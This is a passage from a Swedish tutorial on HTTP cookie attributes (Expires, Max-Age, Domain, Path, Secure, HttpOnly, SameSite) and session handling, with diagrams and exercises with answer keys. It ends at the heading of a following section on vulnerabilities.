**Expires** – Anger ett exakt datum och tid när cookien ska upphöra:
```
Set-Cookie: session_id=abc123; Expires=Wed, 21 Oct 2025 07:28:00 GMT
```

**Max-Age** – Anger livslängd i sekunder från nu:
```
Set-Cookie: session_id=abc123; Max-Age=3600
```

**Jämförelse:**

| Attribut | Beskrivning | Exempel |
|----------|-------------|---------|
| `Expires` | Absolut datum/tid | `Expires=Wed, 21 Oct 2025 07:28:00 GMT` |
| `Max-Age` | Relativ tid i sekunder | `Max-Age=86400` (24 timmar) |
| Inget attribut | Sessionscookie (försvinner när webbläsaren stängs) | `Set-Cookie: temp=123` |

**Viktigt (2024):**
- Chrome och andra moderna webbläsare har infört en **400-dagars gräns** för cookie-livslängd
- Om du sätter längre tid än 400 dagar, trunkeras den automatiskt
- `Max-Age` har företräde över `Expires` om båda finns

**Exempel:**
```
// Sessionscookie (försvinner när webbläsaren stängs)
Set-Cookie: temp_cart=item123

// Cookie som lever i 1 timme
Set-Cookie: search_pref=recent; Max-Age=3600

// Cookie som lever till ett specifikt datum
Set-Cookie: promo=summer2025; Expires=Sat, 01 Sep 2025 00:00:00 GMT

// Cookie som lever i 30 dagar
Set-Cookie: remember_me=true; Max-Age=2592000
```

##### 4.2 Domain – Vilka domäner kan använda cookien?

**Domain**-attributet avgör vilka domäner som får ta emot cookien.

**Syntax:**
```
Set-Cookie: user_id=123; Domain=example.com
```

**Regler:**
- Om `Domain` INTE anges: Cookien gäller bara för den exakta domänen (strict)
- Om `Domain` anges: Cookien gäller för domänen OCH alla subdomäner

**Exempel:**

```
// Scenario 1: Ingen Domain angiven
// Du är på: www.example.com
Set-Cookie: session=abc123

// Cookien skickas till:
// ✓ www.example.com
// ✗ blog.example.com (Nej!)
// ✗ api.example.com (Nej!)
```

```
// Scenario 2: Domain angiven
// Du är på: www.example.com
Set-Cookie: session=abc123; Domain=example.com

// Cookien skickas till:
// ✓ www.example.com
// ✓ blog.example.com (Ja!)
// ✓ api.example.com (Ja!)
// ✓ example.com
```

**Säkerhetsaspekt:**
- Var försiktig med `Domain` – det öppnar cookien för subdomäner
- Om du har en sårbar subdomän kan den stjäla cookies från huvuddomänen!

##### 4.3 Path – Vilka sökvägar kan använda cookien?

**Path**-attributet avgör vilka URL-sökvägar som får ta emot cookien.

**Syntax:**
```
Set-Cookie: pref=dark; Path=/settings
```

**Regler:**
- Cookien skickas bara till URL:er som börjar med den angivna sökvägen
- `Path=/` betyder alla sökvägar (vanligast)

**Exempel:**

```
Set-Cookie: admin_token=xyz; Path=/admin

// Cookien skickas till:
// ✓ example.com/admin
// ✓ example.com/admin/users
// ✓ example.com/admin/settings/profile
// ✗ example.com/ (Nej!)
// ✗ example.com/shop (Nej!)
```

```
Set-Cookie: general=abc; Path=/

// Cookien skickas till:
// ✓ example.com/
// ✓ example.com/shop
// ✓ example.com/admin
// ✓ example.com/any/path/here
```

**Användningsfall:**
- Separera cookies för olika delar av en webbplats
- Begränsa känsliga cookies till specifika områden

##### 4.4 Secure – Endast HTTPS

**Secure**-attributet säger att cookien BARA ska skickas över krypterade HTTPS-anslutningar.

**Syntax:**
```
Set-Cookie: session_id=abc123; Secure
```

**Viktigt:**
- Utan `Secure`: Cookien skickas över både HTTP och HTTPS
- Med `Secure`: Cookien skickas BARA över HTTPS
- Undantag: `localhost` (utveckling) – fungerar även utan HTTPS

**Exempel:**

```
// OSÄKERT – skickas över både HTTP och HTTPS
Set-Cookie: session_id=abc123

// Kan avlyssnas av man-in-the-middle-attack!
```

```
// SÄKERT – skickas bara över HTTPS
Set-Cookie: session_id=abc123; Secure

// Skyddad från avlyssning (krypterad)
```

**Best Practice (2024):**
- Använd **ALLTID** `Secure` för känsliga cookies
- Moderna webbplatser bör köra HTTPS överallt
- Många webbläsare varnar för cookies utan `Secure`

##### 4.5 HttpOnly – Skydd mot JavaScript

**HttpOnly**-attributet förhindrar JavaScript från att läsa cookien via `document.cookie`.

**Syntax:**
```
Set-Cookie: session_id=abc123; HttpOnly
```

**Vad det gör:**
- Cookien är INTE tillgänglig för JavaScript
- Cookien skickas fortfarande automatiskt med HTTP-förfrågningar
- Skyddar mot XSS-attacker (Cross-Site Scripting)

**Exempel:**

```
// UTAN HttpOnly
Set-Cookie: session_id=abc123

// JavaScript kan stjäla cookien:
console.log(document.cookie); // "session_id=abc123"
// En XSS-attack kan skicka denna till en angripare!
```

```
// MED HttpOnly
Set-Cookie: session_id=abc123; HttpOnly

// JavaScript kan INTE se cookien:
console.log(document.cookie); // "" (tom sträng)
// XSS-attack kan inte stjäla session-ID!
```

**Best Practice:**
- Använd **ALLTID** `HttpOnly` för sessions- och autentiseringscookies
- Gör det omöjligt för skadlig JavaScript att stjäla cookies

##### 4.6 SameSite – Skydd mot CSRF

**SameSite**-attributet kontrollerar om cookies skickas vid cross-site requests (förfrågningar från andra webbplatser).

**Syntax:**
```
Set-Cookie: session_id=abc123; SameSite=Strict
Set-Cookie: tracking=xyz; SameSite=Lax
Set-Cookie: widget=def; SameSite=None; Secure
```

**Tre värden:**

**SameSite=Strict** (striktast):
- Cookien skickas BARA vid same-site requests
- INTE vid navigering från externa länkar
- Bäst för säkerhet, men kan vara för restriktivt

**SameSite=Lax** (standard i moderna webbläsare):
- Cookien skickas vid top-level navigering (t.ex. klicka på en länk)
- INTE vid cross-site AJAX, bilder, iframes
- Bra balans mellan säkerhet och användbarhet

**SameSite=None** (minst restriktivt):
- Cookien skickas ALLTID, även cross-site
- KRÄVER `Secure`-attributet
- Används för legitimt cross-site behov (t.ex. tredje parts-widgets)

**Detaljerad jämförelse:**

| Scenario | Strict | Lax | None |
|----------|--------|-----|------|
| Användaren klickar länk från google.com till yoursite.com | ✗ | ✓ | ✓ |
| AJAX-anrop från othersite.com till yoursite.com | ✗ | ✗ | ✓ |
| `<img>` från othersite.com som pekar till yoursite.com | ✗ | ✗ | ✓ |
| `<iframe>` på othersite.com som laddar yoursite.com | ✗ | ✗ | ✓ |
| Form POST från othersite.com till yoursite.com | ✗ | ✗ | ✓ |
| Direkt navigering till yoursite.com | ✓ | ✓ | ✓ |

**Exempel:**

```
// Bank-session: Maximal säkerhet
Set-Cookie: bank_session=abc; SameSite=Strict; Secure; HttpOnly

// Användaren klickar länk från email → bank.com
// Problem: Inte inloggad! (Strict blockerar)
// Lösning: Använd Lax för bättre UX
```

```
// Blogg-session: Balanserad
Set-Cookie: blog_session=xyz; SameSite=Lax; Secure; HttpOnly

// Användaren klickar länk från Twitter → blog.com
// Fungerar! Användaren är inloggad
```

```
// Tredje parts-widget
Set-Cookie: widget_pref=theme; SameSite=None; Secure

// Widget inbäddad på andra sajter fungerar
// OBS: Många webbläsare blockerar ändå tredje parts-cookies!
```

**Best Practice (2024):**
- **Standard:** Om du inte anger `SameSite`, använder moderna webbläsare `Lax` som standard
- **För sessioner:** Använd `SameSite=Lax` eller `Strict`
- **För tredje parts:** Använd `SameSite=None; Secure` (men förvänta dig blockering)

#### 5. Sessionhantering med Cookies

Det vanligaste användningsområdet för cookies är **sessionshantering** – att hålla användare inloggade.

**Hur det fungerar:**

```
1. Användaren loggar in med användarnamn och lösenord
   POST /login
   username=alice&password=secret123

2. Servern verifierar lösenordet
   ✓ Korrekt!

3. Servern skapar en unik session-ID
   session_id = "a7b3f9d2e1c8"

4. Servern sparar session-ID i sin databas/minne
   sessions_db["a7b3f9d2e1c8"] = {user: "alice", login_time: "2024-11-18"}

5. Servern skickar session-ID till klienten som cookie
   Set-Cookie: session_id=a7b3f9d2e1c8; Path=/; HttpOnly; Secure; SameSite=Lax

6. Vid nästa request skickar webbläsaren automatiskt cookien
   GET /profile
   Cookie: session_id=a7b3f9d2e1c8

7. Servern läser session-ID från cookien
   session_id = "a7b3f9d2e1c8"

8. Servern slår upp i sin databas
   sessions_db["a7b3f9d2e1c8"] → user: "alice"

9. Servern vet: "Detta är Alice!" och visar hennes profil
```

**Säkerhetsaspekt:**
- Session-ID:t bör vara **kryptografiskt slumpmässigt** (minst 128 bitar)
- Använd **HttpOnly** (förhindra JavaScript-åtkomst)
- Använd **Secure** (kräv HTTPS)
- Använd **SameSite=Lax** eller **Strict** (förhindra CSRF)

**Exempel på säker sessionscookie:**
```
Set-Cookie: session_id=a7b3f9d2e1c8f4a6b9e2d5c1a8f7b3e9;
            Path=/;
            HttpOnly;
            Secure;
            SameSite=Lax;
            Max-Age=3600
```

#### 6. Komplett HTTP-flöde med Cookies

Låt oss se ett komplett exempel från början till slut:

**Första besöket:**

```
Klient → Server
--------------
GET /index.html HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
```

```
Server → Klient
--------------
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: cart_id=c789; Path=/; Max-Age=86400
Set-Cookie: visitor_id=v456; Path=/; Max-Age=31536000
Set-Cookie: session_id=s123; Path=/; HttpOnly; Secure; SameSite=Lax

<html>
  <body>Welcome to our shop!</body>
</html>
```

**Webbläsaren sparar:**
- `cart_id=c789` (lever i 24 timmar)
- `visitor_id=v456` (lever i 1 år)
- `session_id=s123` (sessionscookie med säkerhetsattribut)

**Andra besöket (samma dag):**

```
Klient → Server
--------------
GET /products HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Cookie: cart_id=c789; visitor_id=v456; session_id=s123
```

Server ser cookies och vet:
- Vilken kundvagn som tillhör användaren
- Att detta är en återkommande besökare
- Att användaren har en aktiv session

#### 7. Första parts vs Tredje parts (teknisk förklaring)

**Första parts-cookie:**
- Cookiens `Domain` matchar den domän du besöker
- Exempel: På `shop.com` får du cookie med `Domain=shop.com`

**Tredje parts-cookie:**
- Cookiens `Domain` matchar INTE den domän du besöker
- Exempel: På `shop.com` laddas en bild från `ads-tracker.com` som sätter en cookie med `Domain=ads-tracker.com`

**Tekniskt exempel:**

```
Du besöker: https://news.com

news.com laddar:
- logo.png från news.com (första parts)
- analytics.js från google-analytics.com (tredje parts)
- ads från adnetwork.com (tredje parts)

Cookies som sätts:
Set-Cookie: news_session=abc; Domain=news.com           // FÖRSTA PARTS
Set-Cookie: ga_id=123; Domain=google-analytics.com      // TREDJE PARTS
Set-Cookie: ad_tracking=xyz; Domain=adnetwork.com       // TREDJE PARTS
```

**Webbläsarbeteende (2024):**
- **Safari & Firefox:** Blockerar tredje parts-cookies som standard
- **Chrome:** Låter användare välja (tidigare planerad blockering senarelagd)
- **Edge:** Följer Chromium-standarden

### Diagram och Visualiseringar

#### Diagram 1: HTTP Request-Response med Cookies

```
FÖRSTA BESÖKET
==============

Klient                                    Server
------                                    ------
  |                                          |
  |  GET /login HTTP/1.1                     |
  |  Host: example.com                       |
  |  (inga cookies)                          |
  |----------------------------------------->|
  |                                          |
  |                                          | Skapar session: s123
  |                                          | Sparar i databas
  |                                          |
  |  HTTP/1.1 200 OK                         |
  |  Set-Cookie: session_id=s123;            |
  |              HttpOnly; Secure            |
  |<-----------------------------------------|
  |                                          |
  | Sparar cookie:                           |
  | session_id=s123                          |
  |                                          |

EFTERFÖLJANDE BESÖK
===================

Klient                                    Server
------                                    ------
  |                                          |
  |  GET /profile HTTP/1.1                   |
  |  Host: example.com                       |
  |  Cookie: session_id=s123                 |
  |----------------------------------------->|
  |                                          |
  |                                          | Läser session_id
  |                                          | Slår upp i databas
  |                                          | Hittar användare!
  |                                          |
  |  HTTP/1.1 200 OK                         |
  |  <html>Welcome back, Alice!</html>       |
  |<-----------------------------------------|
  |                                          |
```

#### Diagram 2: Cookie-attribut och deras effekter

```
+------------------+--------------------------------------------------+
| ATTRIBUT         | EFFEKT                                           |
+------------------+--------------------------------------------------+
| Expires/Max-Age  | Bestämmer livslängd                              |
|                  | [Ingen] → Session (tills webbläsaren stängs)    |
|                  | [Datum/sekunder] → Persistent                    |
+------------------+--------------------------------------------------+
| Domain           | Bestämmer vilka domäner som får cookien          |
|                  | [Ingen] → Endast exakt domän                     |
|                  | [example.com] → Domän + alla subdomäner          |
+------------------+--------------------------------------------------+
| Path             | Bestämmer vilka URL-sökvägar som får cookien     |
|                  | [/] → Alla sökvägar                              |
|                  | [/admin] → Endast /admin och undersökvägar       |
+------------------+--------------------------------------------------+
| Secure           | Kräver HTTPS                                     |
|                  | [Ingen] → HTTP och HTTPS OK                      |
|                  | [Secure] → Endast HTTPS                          |
+------------------+--------------------------------------------------+
| HttpOnly         | Blockerar JavaScript-åtkomst                     |
|                  | [Ingen] → document.cookie fungerar               |
|                  | [HttpOnly] → document.cookie kan ej läsa         |
+------------------+--------------------------------------------------+
| SameSite         | Kontrollerar cross-site requests                 |
|                  | [Strict] → Aldrig cross-site                     |
|                  | [Lax] → Vissa cross-site OK (länkar)             |
|                  | [None] → Alltid (kräver Secure)                  |
+------------------+--------------------------------------------------+
```

#### Tabell: Exempel på Cookie-konfigurationer

| Användningsfall | Cookie-exempel | Förklaring |
|-----------------|---------------|------------|
| **Säker session** | `Set-Cookie: sid=abc; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600` | Session i 1h, alla säkerhetsattribut |
| **"Kom ihåg mig"** | `Set-Cookie: remember=1; Path=/; Secure; SameSite=Lax; Max-Age=2592000` | 30 dagar, men INTE HttpOnly (JS kan behöva läsa) |
| **Språkval** | `Set-Cookie: lang=sv; Path=/; Max-Age=31536000` | 1 år, inget säkerhetsbehov |
| **Admin-session** | `Set-Cookie: admin=xyz; Path=/admin; HttpOnly; Secure; SameSite=Strict` | Extra strikt, endast /admin |
| **Tracking (tredje parts)** | `Set-Cookie: track=123; Domain=ads.com; SameSite=None; Secure; Max-Age=31536000` | Cross-site, men blockeras ofta |

### 💡 Pro Tips

**Pro Tip 1: Inspektera cookies i DevTools**
Öppna Developer Tools (F12) i din webbläsare:
- Chrome/Edge: Application → Cookies
- Firefox: Storage → Cookies
- Här ser du ALLA cookies, deras värden och attribut!

**Pro Tip 2: Max-Age vs Expires – använd Max-Age**
`Max-Age` är nyare och enklare att arbeta med (relativ tid istället för absolut datum). Modern kod bör föredra `Max-Age`.

**Pro Tip 3: Standard-värden i moderna webbläsare**
Om du inte anger `SameSite`, sätter moderna webbläsare (2024) automatiskt `SameSite=Lax`. Detta är en säkerhetsfunktion!

**Pro Tip 4: Cookie-storlek är begränsad**
- Max ~4KB per cookie
- Max ~50-180 cookies per domän (beroende på webbläsare)
- Håll cookies små!

**Pro Tip 5: Debugging med curl**
Du kan se HTTP-headers (inklusive cookies) med `curl`:
```bash
curl -v https://example.com
```
Letar efter `Set-Cookie` i outputen!

### ✏️ Övningar

#### Övning 1: Tolka Set-Cookie headers

För varje `Set-Cookie`-header, beskriv vad den gör:

**A)** `Set-Cookie: user_pref=dark_mode`

**B)** `Set-Cookie: session=xyz123; HttpOnly; Secure`

**C)** `Set-Cookie: tracking=abc; Domain=example.com; Max-Age=31536000`

**D)** `Set-Cookie: temp=123; Path=/checkout`

**E)** `Set-Cookie: auth=token; HttpOnly; Secure; SameSite=Strict; Max-Age=7200`

<details>
<summary>📖 Visa facit</summary>

**A)** `Set-Cookie: user_pref=dark_mode`
- Namn: `user_pref`, Värde: `dark_mode`
- Inga attribut → Sessionscookie (försvinner när webbläsaren stängs)
- Kan läsas av JavaScript
- Skickas över både HTTP och HTTPS
- Standard `SameSite=Lax` i moderna webbläsare

**B)** `Set-Cookie: session=xyz123; HttpOnly; Secure`
- Namn: `session`, Värde: `xyz123`
- `HttpOnly` → JavaScript kan inte läsa (skydd mot XSS)
- `Secure` → Skickas bara över HTTPS
- Ingen livslängd → Sessionscookie
- Bra för säker sessionshantering!

**C)** `Set-Cookie: tracking=abc; Domain=example.com; Max-Age=31536000`
- Namn: `tracking`, Värde: `abc`
- `Domain=example.com` → Gäller för example.com OCH alla subdomäner (blog.example.com, api.example.com, etc.)
- `Max-Age=31536000` → Lever i 31536000 sekunder = 365 dagar = 1 år
- Permanent cookie
- Kan läsas av JavaScript (ingen HttpOnly)

**D)** `Set-Cookie: temp=123; Path=/checkout`
- Namn: `temp`, Värde: `123`
- `Path=/checkout` → Skickas bara till URL:er som börjar med /checkout
- Sessionscookie (ingen livslängd)
- Begränsad till en specifik del av webbplatsen

**E)** `Set-Cookie: auth=token; HttpOnly; Secure; SameSite=Strict; Max-Age=7200`
- Namn: `auth`, Värde: `token`
- `HttpOnly` → Skyddad från JavaScript
- `Secure` → Endast HTTPS
- `SameSite=Strict` → Skickas ALDRIG från andra webbplatser (maximal CSRF-skydd)
- `Max-Age=7200` → Lever i 7200 sekunder = 2 timmar
- Mycket säker autentiseringscookie!

</details>

#### Övning 2: Rätt eller Fel?

Avgör om påståendena är sanna eller falska:

**A)** En cookie med `HttpOnly` skickas inte med HTTP-requests.

**B)** Om en cookie har `SameSite=Strict`, kommer den att skickas när användaren klickar på en länk från Google till din webbplats.

**C)** Attributet `Secure` kräver att cookien endast skickas över HTTPS (utom localhost).

**D)** Om ingen `Expires` eller `Max-Age` anges, lever cookien för alltid.

**E)** En cookie med `Domain=example.com` gäller för `sub.example.com`.

**F)** Attribut som `HttpOnly` och `Secure` skickas tillbaka till servern i `Cookie`-headern.

<details>
<summary>📖 Visa facit</summary>

**A) FALSKT** ✗
En cookie med `HttpOnly` skickas fortfarande med HTTP-requests! `HttpOnly` betyder bara att JavaScript inte kan läsa cookien via `document.cookie`. Cookien skickas normalt till servern.

**B) FALSKT** ✗
Med `SameSite=Strict` skickas cookien INTE när användaren klickar en länk från en extern sajt (t.ex. Google). Den skickas bara vid "same-site" requests. För att tillåta detta skulle man behöva `SameSite=Lax` eller `None`.

**C) SANT** ✓
Korrekt! `Secure` betyder att cookien bara skickas över HTTPS. Undantaget är `localhost` där utvecklare kan testa utan HTTPS.

**D) FALSKT** ✗
Om ingen `Expires` eller `Max-Age` anges är det en **sessionscookie** som försvinner när webbläsaren stängs. Den lever inte för alltid!

**E) SANT** ✓
Korrekt! En cookie med `Domain=example.com` gäller för huvuddomänen OCH alla subdomäner (sub.example.com, api.example.com, etc.).

**F) FALSKT** ✗
Nej! När webbläsaren skickar tillbaka cookies i `Cookie`-headern skickas BARA namn och värde. Attribut som `HttpOnly`, `Secure`, `SameSite` etc. används av webbläsaren för att bestämma vilka cookies som ska skickas, men de skickas inte själva.

</details>

#### Övning 3: Designa en cookie

För varje scenario, skriv rätt `Set-Cookie`-header:

**A)** En sessionscookie för inloggning som ska vara maximalt säker.

**B)** En cookie som kommer ihåg användarens tema-val (mörkt/ljust) i 90 dagar.

**C)** En administratörssession som bara fungerar under `/admin` och är extra säker.

**D)** En cookie för kundvagn som ska fungera på huvuddomänen och alla subdomäner i 7 dagar.

<details>
<summary>📖 Visa facit</summary>

**A) Säker sessionscookie för inloggning:**
```
Set-Cookie: session_id=a7b3f9d2e1c8f4a6; Path=/; HttpOnly; Secure; SameSite=Lax
```

**Förklaring:**
- Ingen `Max-Age`/`Expires` → Sessionscookie
- `HttpOnly` → Skydd mot XSS
- `Secure` → Endast HTTPS
- `SameSite=Lax` → Balans mellan säkerhet och användbarhet (fungerar när användare klickar länkar)
- `Path=/` → Gäller hela webbplatsen

**B) Tema-val i 90 dagar:**
```
Set-Cookie: theme=dark; Path=/; Max-Age=7776000; SameSite=Lax
```

**Förklaring:**
- `Max-Age=7776000` → 90 dagar (90 × 24 × 60 × 60 sekunder)
- Ingen `HttpOnly` → JavaScript kan behöva läsa/ändra tema
- Ingen `Secure` → Tema är inte känsligt (men Secure är ändå bra practice)
- `SameSite=Lax` → Standard, inget cross-site behov

**C) Admin-session:**
```
Set-Cookie: admin_session=xyz789abc; Path=/admin; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
```

**Förklaring:**
- `Path=/admin` → Begränsad till admin-området
- `HttpOnly` → Skydd mot XSS
- `Secure` → Endast HTTPS
- `SameSite=Strict` → Extra skydd, admin behöver inte cross-site funktionalitet
- `Max-Age=3600` → 1 timme (kort för säkerhet)

**D) Kundvagn på alla domäner/subdomäner i 7 dagar:**
```
Set-Cookie: cart_id=c123456; Domain=example.com; Path=/; Max-Age=604800; SameSite=Lax
```

**Förklaring:**
- `Domain=example.com` → Fungerar på example.com, shop.example.com, api.example.com, etc.
- `Max-Age=604800` → 7 dagar (7 × 24 × 60 × 60 sekunder)
- `Path=/` → Alla sökvägar
- `SameSite=Lax` → Standard
- Kan ha `Secure` för extra säkerhet

</details>

#### Övning 4: Felsökning

Hitta problemen i dessa cookie-konfigurationer:

**A)**
```
Set-Cookie: session=abc123
```
(För en bank-inloggning)

**B)**
```
Set-Cookie: api_key=secret789; SameSite=None
```

**C)**
```
Set-Cookie: user_id=12345; Domain=.com
```

**D)**
```
Set-Cookie: pref=settings; Max-Age=99999999999
```

<details>
<summary>📖 Visa facit</summary>

**A) Problem:**
```
Set-Cookie: session=abc123
```

**Fel:** Saknar alla säkerhetsattribut för en bank-session!

**Risker:**
- Ingen `HttpOnly` → XSS kan stjäla session
- Ingen `Secure` → Session kan avlyssnas över HTTP
- Ingen `SameSite` → CSRF-attack möjlig
- Ingen livslängd definierad men sessionscookie kan vara OK

**Bättre:**
```
Set-Cookie: session=abc123; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=900
```
(15 minuter för bank, alla säkerhetsattribut)

**B) Problem:**
```
Set-Cookie: api_key=secret789; SameSite=None
```

**Fel:** `SameSite=None` KRÄVER `Secure`-attributet!

**Risker:**
- Modern webbläsare kommer att avvisa denna cookie
- API-nyckeln är känslig men saknar `HttpOnly` och `Secure`

**Bättre:**
```
Set-Cookie: api_key=secret789; HttpOnly; Secure; SameSite=None
```
(Om cross-site verkligen behövs, annars använd Lax/Strict)

**C) Problem:**
```
Set-Cookie: user_id=12345; Domain=.com
```

**Fel:** `Domain=.com` är för brett och inte tillåtet!

**Risker:**
- Man kan inte sätta cookies för top-level domains (`.com`, `.org`, etc.)
- Webbläsaren kommer att ignorera detta
- Säkerhetsfara om det funkade – alla `.com`-sajter skulle få cookien!

**Bättre:**
```
Set-Cookie: user_id=12345; Domain=example.com
```
(Eller utelämna Domain för endast exakt domän)

**D) Problem:**
```
Set-Cookie: pref=settings; Max-Age=99999999999
```

**Fel:** `Max-Age` är för lång!

**Risker:**
- 99999999999 sekunder ≈ 3168 år!
- Sedan 2024 begränsar Chrome cookies till max 400 dagar
- Denna cookie kommer att trunkeras till 400 dagar automatiskt

**Bättre:**
```
Set-Cookie: pref=settings; Max-Age=34560000
```
(400 dagar = 34560000 sekunder, inom gränsen)

</details>

#### Övning 5: HTTP-flödesanalys

Analysera denna HTTP-kommunikation och besvara frågorna:

```
// Request 1
GET /login HTTP/1.1
Host: webshop.com

// Response 1
HTTP/1.1 200 OK
Set-Cookie: session=s111; HttpOnly; Secure; SameSite=Lax
Set-Cookie: cart=empty; Max-Age=604800
<html>Login page</html>

// Request 2
POST /api/add-to-cart HTTP/1.1
Host: webshop.com
Cookie: session=s111; cart=empty

// Response 2
HTTP/1.1 200 OK
Set-Cookie: cart=item_42; Max-Age=604800
{"status": "added"}

// Request 3
GET /checkout HTTP/1.1
Host: webshop.com
Cookie: session=s111; cart=item_42
```

**Frågor:**
1. Vilka cookies sparades efter Response 1?
2. Varför skickades båda cookies i Request 2?
3. Vad hände med cart-cookien mellan Request 2 och Request 3?
4. Hur länge lever session-cookien?
5. Kan JavaScript läsa session-cookien?

<details>
<summary>📖 Visa facit</summary>

**1. Vilka cookies sparades efter Response 1?**

Två cookies sparades:
- `session=s111` med attributen `HttpOnly`, `Secure`, `SameSite=Lax` (sessionscookie, ingen Max-Age)
- `cart=empty` med `Max-Age=604800` (7 dagar)

**2. Varför skickades båda cookies i Request 2?**

Webbläsaren skickar automatiskt ALLA relevanta cookies för domänen. Både `session` och `cart` cookies:
- Gäller för webshop.com (ingen Domain-begränsning betyder exakt domän)
- Har Path=/ (default, gäller alla sökvägar)
- Har inte upphört

Därför skickas båda: `Cookie: session=s111; cart=empty`

**3. Vad hände med cart-cookien mellan Request 2 och Request 3?**

Servern uppdaterade cart-cookien i Response 2:
- Gamla värdet: `cart=empty`
- Nya värdet: `cart=item_42`

Webbläsaren ersatte den gamla cookien med den nya. I Request 3 skickas det uppdaterade värdet.

**4. Hur länge lever session-cookien?**

`session`-cookien är en **sessionscookie** (ingen `Max-Age` eller `Expires`), så den lever tills:
- Webbläsaren stängs, eller
- Cookien explicit raderas

**5. Kan JavaScript läsa session-cookien?**

**NEJ!** Session-cookien har attributet `HttpOnly`, vilket betyder att JavaScript inte kan läsa den via `document.cookie`. Detta är ett skydd mot XSS-attacker.

Cart-cookien SAKNAR `HttpOnly`, så JavaScript KAN läsa den (om det behövs för frontend-funktionalitet).

</details>

#### Övning 6: SameSite-scenarier

För varje scenario, avgör om cookien skickas:

Du har en cookie:
```
Set-Cookie: user_session=abc123; SameSite=Lax; Secure
```

På domän: `yoursite.com`

**Scenarios:**

**A)** Användaren är på `yoursite.com/home` och klickar en länk till `yoursite.com/profile`

**B)** Användaren är på `google.com` och klickar en länk till `yoursite.com/article`

**C)** En AJAX-request från `othersite.com` anropar `yoursite.com/api/data`

**D)** En `<img src="https://yoursite.com/logo.png">` laddas på `blog.com`

**E)** Ett formulär på `external.com` gör POST till `yoursite.com/submit`

<details>
<summary>📖 Visa facit</summary>

Med `SameSite=Lax`:

**A) Skickas: JA** ✓
Navigering inom samma sajt (yoursite.com → yoursite.com) är alltid OK. Cookien skickas.

**B) Skickas: JA** ✓
`SameSite=Lax` tillåter cookies vid "top-level navigation" från externa sajter (när användaren klickar en länk). Detta skickas.

**C) Skickas: NEJ** ✗
AJAX-requests från andra domäner blockeras av `SameSite=Lax`. Cookien skickas INTE.

**D) Skickas: NEJ** ✗
Subresources (bilder, scripts, etc.) från andra domäner blockeras av `SameSite=Lax`. Cookien skickas INTE.

**E) Skickas: NEJ** ✗
Form POST från externa sajter blockeras av `SameSite=Lax`. Detta är huvudsyftet – CSRF-skydd! För att tillåta detta skulle man behöva `SameSite=None; Secure`.

**Sammanfattning:**
`SameSite=Lax` tillåter:
- ✓ Samma-site requests
- ✓ Top-level navigation (klicka länkar från andra sajter)

`SameSite=Lax` blockerar:
- ✗ Cross-site AJAX
- ✗ Cross-site subresources (img, iframe, etc.)
- ✗ Cross-site form POST

</details>

#### Övning 7: Beräkna Max-Age

Konvertera till sekunder för `Max-Age`:

**A)** 1 timme
**B)** 24 timmar (1 dag)
**C)** 7 dagar
**D)** 30 dagar
**E)** 1 år (365 dagar)
**F)** 400 dagar (Chrome-gränsen)

<details>
<summary>📖 Visa facit</summary>

Formel: `sekunder = dagar × 24 × 60 × 60`

**A) 1 timme:**
```
1 × 60 × 60 = 3600 sekunder
Set-Cookie: temp=123; Max-Age=3600
```

**B) 24 timmar (1 dag):**
```
24 × 60 × 60 = 86400 sekunder
Set-Cookie: daily=abc; Max-Age=86400
```

**C) 7 dagar:**
```
7 × 24 × 60 × 60 = 604800 sekunder
Set-Cookie: weekly=xyz; Max-Age=604800
```

**D) 30 dagar:**
```
30 × 24 × 60 × 60 = 2592000 sekunder
Set-Cookie: monthly=def; Max-Age=2592000
```

**E) 1 år (365 dagar):**
```
365 × 24 × 60 × 60 = 31536000 sekunder
Set-Cookie: yearly=ghi; Max-Age=31536000
```

**F) 400 dagar (Chrome-gränsen 2024):**
```
400 × 24 × 60 × 60 = 34560000 sekunder
Set-Cookie: max_allowed=jkl; Max-Age=34560000
```

**Tips:** Spara dessa vanliga värden för snabb referens i din kod!

</details>

### 📝 Sammanfattning

**Viktigaste lärdomarna från Nivå 3:**

- **HTTP är statslöst** – cookies skapar tillstånd genom att lagra data mellan requests
- **Set-Cookie**-headern används av servern för att skapa cookies
- **Cookie**-headern används av klienten för att skicka tillbaka cookies
- **Expires/Max-Age** kontrollerar livslängd (ingen = sessionscookie)
- **Domain** och **Path** kontrollerar scope (vilka URL:er får cookien)
- **Secure** kräver HTTPS (skydd mot man-in-the-middle)
- **HttpOnly** blockerar JavaScript-åtkomst (skydd mot XSS)
- **SameSite** kontrollerar cross-site behavior (skydd mot CSRF)
  - `Strict` = aldrig cross-site
  - `Lax` = vissa cross-site OK (standard)
  - `None` = alltid (kräver Secure)
- **Sessionshantering** är den vanligaste användningen av cookies
- **Moderna webbläsare (2024)** har 400-dagars gräns och `SameSite=Lax` som standard

**Tekniska termer du lärt dig:**

- **HTTP (HyperText Transfer Protocol)** – Webbens kommunikationsprotokoll
- **Stateless/Statslöst** – Servern minns inte tidigare requests
- **Header/Rubrik** – Metadata i HTTP-meddelanden
- **Set-Cookie** – Header för att skapa cookies
- **Cookie** – Header för att skicka cookies
- **Expires** – Absolut utgångsdatum
- **Max-Age** – Relativ livslängd i sekunder
- **Domain** – Vilka domäner som får cookien
- **Path** – Vilka URL-sökvägar som får cookien
- **Secure** – Kräv HTTPS
- **HttpOnly** – Blockera JavaScript
- **SameSite** – Kontrollera cross-site requests
- **Session ID** – Unikt ID för att identifiera användarsession
- **XSS (Cross-Site Scripting)** – Attack där skadlig JavaScript körs
- **CSRF (Cross-Site Request Forgery)** – Attack där förfrågan skapas från annan sajt
- **First-party cookie** – Cookie från besökt domän
- **Third-party cookie** – Cookie från annan domän

**Nästa steg:**

Nu när du förstår den tekniska mekaniken bakom cookies är det dags att gå djupt in i säkerhetssårbarheter! I nästa nivå (Nivå 4) kommer vi att undersöka exakt hur cookies kan utnyttjas i attacker (XSS, CSRF, session hijacking), hur man försvarar sig, och vilka best practices som gäller. Vi går in på universitetsnivå med hotmodeller och defensive coding!

---

## Nivå 4: Sårbarheter och best practices 🏛️

### Introduktion

